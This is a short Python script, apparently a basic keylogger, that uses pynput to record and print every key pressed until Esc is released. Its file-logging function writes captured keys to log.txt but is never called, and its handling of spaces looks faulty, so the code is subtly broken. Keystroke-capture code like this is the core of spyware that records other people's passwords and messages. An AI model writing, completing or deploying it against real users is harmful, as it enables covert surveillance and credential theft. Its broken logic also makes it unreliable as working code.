import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key): 
    global keys, count 
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))  


def write_file(keys_list):
    with open("log.txt", "w") as f:
        for key in keys_list:
            k = str(key).replace("'", "")  
            if k.find("space") > 10:
                f.write('\n')
            elif k.find("Key") == -1: 
                f.write(k)

def on_release(key):
    if key == Key.esc:  
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()